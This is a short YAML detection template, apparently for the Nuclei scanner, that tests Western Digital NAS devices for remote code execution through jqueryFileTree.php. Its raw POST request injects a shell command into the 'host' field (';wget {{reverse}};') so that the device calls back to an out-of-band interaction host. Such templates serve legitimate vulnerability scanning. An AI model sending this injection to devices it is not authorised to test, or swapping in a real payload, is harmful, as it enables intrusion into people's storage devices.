id: poc-yaml-west-nas-jqueryfiletree-php-rce
info:
  name: Western Digital NAS jqueryFileTree.php Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,dns,oast

variables:
  reverse: '{{interactsh-url}}'

http:
  - raw:
      - |
        POST /web/addons/jqueryFileTree.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        host=";wget {{reverse}};"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "X-Powered-By: PHP/5.4.16"
      - type: word
        part: body
        words:
          - ""
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
